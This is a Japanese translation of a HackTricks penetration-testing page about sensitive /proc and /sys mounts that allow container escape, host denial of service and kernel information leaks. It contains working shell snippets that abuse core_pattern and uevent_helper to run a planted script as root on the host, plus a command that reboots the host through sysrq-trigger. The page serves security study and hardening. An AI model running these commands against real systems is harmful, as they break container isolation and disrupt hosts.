<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手してください。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックしてください。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングテクニックを共有してください。

</details>


(_**この情報は**_ [_**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**_](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts) _**から取得されました**_)

名前空間のサポートが不足しているため、`/proc`と`/sys`の露出は、大きな攻撃面と情報漏洩の源泉を提供します。`procfs`と`sysfs`内の多数のファイルは、コンテナ脱出、ホストの変更、または他の攻撃を容易にする基本的な情報漏洩のリスクを提供します。

これらのテクニックを悪用するためには、**AppArmorはパスベースであるため、`-v /proc:/host/proc`のようなものを誤って設定するだけで十分かもしれません**。

# procfs

## /proc/sys

`/proc/sys`は通常、`sysctl(2)`を通じて制御されるカーネル変数を変更するアクセスを許可します。

### /proc/sys/kernel/core\_pattern

[/proc/sys/kernel/core\_pattern](https://man7.org/linux/man-pages/man5/core.5.html)は、コアファイル生成時（通常はプログラムクラッシュ時）に実行されるプログラムを定義し、このファイルの最初の文字がパイプ記号`|`である場合、標準入力としてコアファイルが渡されます。このプログラムはrootユーザーによって実行され、コマンドライン引数として最大128バイトまで許可されます。これにより、クラッシュとコアファイル生成（悪意のある行動の中で単に破棄される可能性がある）があれば、コンテナホスト内で簡単にコード実行が可能になります。
```bash
[ -w /proc/sys/kernel/core_pattern ] && echo Yes #For testing
cd /proc/sys/kernel
echo "|$overlay/shell.sh" > core_pattern
sleep 5 && ./crash &
```
### /proc/sys/kernel/modprobe

[/proc/sys/kernel/modprobe](https://man7.org/linux/man-pages/man5/proc.5.html) には、[modprobe](https://man7.org/linux/man-pages/man8/modprobe.8.html) コマンドなどを介してカーネルモジュールをロードする際に呼び出されるカーネルモジュールローダーへのパスが含まれています。現在ロードされていない暗号モジュールをロードするためにcrypto-APIを使用するか、現在使用されていないデバイスのネットワーキングモジュールをロードするためにifconfigを使用するなど、カーネルがカーネルモジュールのロードを試みるアクションをトリガーすることにより、コード実行が可能になります。
```bash
# Check if you can directly access modprobe
ls -l `cat /proc/sys/kernel/modprobe`
```
### /proc/sys/vm/panic\_on\_oom

[/proc/sys/vm/panic\_on\_oom](https://man7.org/linux/man-pages/man5/proc.5.html) は、メモリ不足（OOM）の状態が発生したときに、カーネルがパニックするか（OOMキラーを呼び出すのではなく）、どうかを決定するグローバルフラグです。これはコンテナ脱出よりもサービス拒否（DoS）攻撃に近いですが、ホストのみが持つべき能力を露呈しています。

### /proc/sys/fs

[/proc/sys/fs](https://man7.org/linux/man-pages/man5/proc.5.html) ディレクトリには、クォータ、ファイルハンドル、inode、dentry情報を含むファイルシステムのさまざまな側面に関するオプションと情報が含まれています。このディレクトリへの書き込みアクセスを許可すると、ホストに対するさまざまなサービス拒否攻撃を可能にします。

### /proc/sys/fs/binfmt\_misc

[/proc/sys/fs/binfmt\_misc](https://man7.org/linux/man-pages/man5/proc.5.html) は、さまざまな**非ネイティブバイナリ**形式（Javaなど）に対して、そのマジックナンバーに基づいてさまざまな**インタープリタを登録することを可能にします。カーネルにバイナリをハンドラとして登録することで実行させることができます。\
[https://github.com/toffan/binfmt\_misc](https://github.com/toffan/binfmt\_misc) でエクスプロイトを見つけることができます：_貧乏人のルートキット、_ [_binfmt\_misc_](https://github.com/torvalds/linux/raw/master/Documentation/admin-guide/binfmt-misc.rst) _の_ [_credentials_](https://github.com/torvalds/linux/blame/3bdb5971ffc6e87362787c770353eb3e54b7af30/Documentation/binfmt\_misc.txt#L62) _オプションを利用して、`/proc/sys/fs/binfmt_misc/register`が書き込み可能であれば、任意のsuidバイナリを通じて権限を昇格させ（そしてrootシェルを取得）します。_

このテクニックの詳細な説明については、[https://www.youtube.com/watch?v=WBC7hhgMvQQ](https://www.youtube.com/watch?v=WBC7hhgMvQQ) を確認してください。

## /proc/config.gz

[/proc/config.gz](https://man7.org/linux/man-pages/man5/proc.5.html) は `CONFIG_IKCONFIG_PROC` の設定に依存し、実行中のカーネルのカーネル設定オプションの圧縮バージョンを公開します。これにより、侵害されたり悪意のあるコンテナが、カーネルで有効にされている脆弱な領域を簡単に発見してターゲットにすることができます。

## /proc/sysrq-trigger

`Sysrq` は、特別な `SysRq` キーボードの組み合わせを介して呼び出すことができる古いメカニズムです。これにより、システムの即時再起動、`sync(2)` の発行、すべてのファイルシステムの読み取り専用としての再マウント、カーネルデバッガの呼び出し、その他の操作が可能になります。

ゲストが適切に隔離されていない場合、`/proc/sysrq-trigger` ファイルに文字を書き込むことで [sysrq](https://www.kernel.org/doc/html/v4.11/admin-guide/sysrq.html) コマンドをトリガーすることができます。
```bash
# Reboot the host
echo b > /proc/sysrq-trigger
```
## /proc/kmsg

[/proc/kmsg](https://man7.org/linux/man-pages/man5/proc.5.html) は、通常 `dmesg` 経由でアクセスされるカーネルリングバッファメッセージを公開します。この情報の露出は、カーネルのexploit開発を助け、カーネルアドレスのリークを引き起こす可能性があります（これはカーネルアドレス空間レイアウトランダマイゼーション（KASLR）を打ち負かすのに役立つかもしれません）、またカーネル、ハードウェア、ブロックされたパケット、その他のシステムの詳細に関する一般的な情報開示の源となります。

## /proc/kallsyms

[/proc/kallsyms](https://man7.org/linux/man-pages/man5/proc.5.html) には、動的およびロード可能なモジュールのカーネルエクスポートシンボルとそのアドレスの場所が含まれています。これには、物理メモリ内のカーネルのイメージの位置も含まれており、カーネルexploitの開発に役立ちます。これらの位置から、カーネルのベースアドレスまたはオフセットを見つけることができ、カーネルアドレス空間レイアウトランダマイゼーション（KASLR）を克服するために使用できます。

`kptr_restrict` が `1` または `2` に設定されているシステムでは、このファイルは存在しますが、アドレス情報は提供されません（ただし、シンボルがリストされている順序はメモリ内の順序と同一です）。

## /proc/\[pid]/mem

[/proc/\[pid\]/mem](https://man7.org/linux/man-pages/man5/proc.5.html) は、カーネルメモリデバイス `/dev/mem` へのインターフェースを公開します。PID Namespaceはこの `procfs` ベクターを介したいくつかの攻撃から保護するかもしれませんが、この領域は歴史的に脆弱であり、安全だと考えられていた後、再び権限昇格に[vulnerable](https://git.zx2c4.com/CVE-2012-0056/about/)であることが見つかりました。

## /proc/kcore

[/proc/kcore](https://man7.org/linux/man-pages/man5/proc.5.html) は、システムの物理メモリを表し、通常コアダンプファイルで見られるELFコアフォーマットです。このファイルの読み取りは特権ユーザーに制限されており、ホストシステムと他のコンテナからのメモリ内容をリークする可能性があります。

報告された大きなファイルサイズは、アーキテクチャの物理的にアドレス可能なメモリの最大量を表しており、それを読む際に問題を引き起こす可能性があります（ソフトウェアの脆弱性によってはクラッシュすることもあります）。

[Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)

## /proc/kmem

`/proc/kmem` は、[/dev/kmem](https://man7.org/linux/man-pages/man4/kmem.4.html)（cgroupデバイスホワイトリストによって直接アクセスがブロックされている）の代替インターフェースであり、カーネル仮想メモリを表すキャラクタデバイスファイルです。読み書きが可能で、カーネルメモリの直接変更を許可します。

## /proc/mem

`/proc/mem` は、[/dev/mem](https://man7.org/linux/man-pages/man4/kmem.4.html)（cgroupデバイスホワイトリストによって直接アクセスがブロックされている）の代替インターフェースであり、システムの物理メモリを表すキャラクタデバイスファイルです。読み書きが可能で、すべてのメモリの変更を許可します。（`kmem`よりもわずかに繊細さが必要ですが、仮想アドレスを物理アドレスに解決する必要があります）。

## /proc/sched\_debug

`/proc/sched_debug` は、システム全体のプロセススケジューリング情報を返す特別なファイルです。この情報には、すべての名前空間からのプロセス名とプロセスIDに加えて、プロセスcgroup識別子が含まれています。これはPID名前空間の保護を効果的にバイパスし、他の/世界から読み取り可能なので、特権のないコンテナでも悪用される可能性があります。

## /proc/\[pid]/mountinfo

[/proc/\[pid\]/mountinfo](https://man7.org/linux/man-pages/man5/proc.5.html) には、プロセスのマウント名前空間内のマウントポイントに関する情報が含まれています。コンテナの `rootfs` またはイメージの位置を公開します。

# sysfs

## /sys/kernel/uevent\_helper

`uevents` は、デバイスが追加または削除されたときにカーネルによってトリガーされるイベントです。特に、`uevent_helper` のパスは `/sys/kernel/uevent_helper` に書き込むことで変更できます。その後、`uevent` がトリガーされると（これは `/sys/class/mem/null/uevent` などのファイルに書き込むことでユーザーランドからも行うことができます）、悪意のある `uevent_helper` が実行されます。
```bash
# Creates a payload
cat "#!/bin/sh" > /evil-helper
cat "ps > /output" >> /evil-helper
chmod +x /evil-helper
# Finds path of OverlayFS mount for container
# Unless the configuration explicitly exposes the mount point of the host filesystem
# see https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
# Sets uevent_helper to /path/payload
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
# Triggers a uevent
echo change > /sys/class/mem/null/uevent
# or else
# echo /sbin/poweroff > /sys/kernel/uevent_helper
# Reads the output
cat /output
```
## /sys/class/thermal

ACPIおよび温度制御のための様々なハードウェア設定へのアクセスを提供します。通常、ラップトップやゲーミングマザーボードで見られます。これにより、コンテナホストに対するDoS攻撃が可能となり、物理的な損傷に至る可能性もあります。

## /sys/kernel/vmcoreinfo

このファイルはカーネルアドレスを漏洩する可能性があり、KASLRを回避するために使用されることがあります。

## /sys/kernel/security

`/sys/kernel/security`には`securityfs`インターフェースがマウントされており、Linux Security Modulesの設定を可能にします。これにより[AppArmorポリシー](https://gitlab.com/apparmor/apparmor/-/wikis/Kernel\_interfaces#securityfs-syskernelsecurityapparmor)の設定が可能となり、コンテナがMACシステムを無効にすることができるかもしれません。

## /sys/firmware/efi/vars

`/sys/firmware/efi/vars`はNVRAM内のEFI変数と対話するインターフェースを公開しています。これは通常のサーバーにはあまり関係ありませんが、EFIはますます人気が高まっています。権限の弱さが原因で、いくつかのラップトップが故障したこともあります。

## /sys/firmware/efi/efivars

`/sys/firmware/efi/efivars`はUEFIブート引数用のNVRAMに書き込むためのインターフェースを提供します。これを変更すると、ホストマシンが起動不能になる可能性があります。

## /sys/kernel/debug

`debugfs`は、カーネル（またはカーネルモジュール）がユーザーランドにアクセス可能なデバッグインターフェースを作成できる「ルールなし」のインターフェースを提供します。過去にはいくつかのセキュリティ問題があり、ファイルシステムの背後にある「ルールなし」のガイドラインはしばしばセキュリティ制約と衝突しています。

# 参考文献

* [Understanding and Hardening Linux Containers](https://research.nccgroup.com/wp-content/uploads/2020/07/ncc\_group\_understanding\_hardening\_linux\_containers-1-1.pdf)
* [Abusing Privileged and Unprivileged Linux Containers](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2016/june/container\_whitepaper.pdf)


<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

他のHackTricksをサポートする方法:

* **HackTricksに広告を掲載したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください。
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションをチェックする
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)に**参加する**か、[**telegramグループ**](https://t.me/peass)に参加する、または**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* **HackTricks**の[**githubリポジトリ**](https://github.com/carlospolop/hacktricks)や[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)にPRを提出して、あなたのハッキングのコツを共有する。

</details>
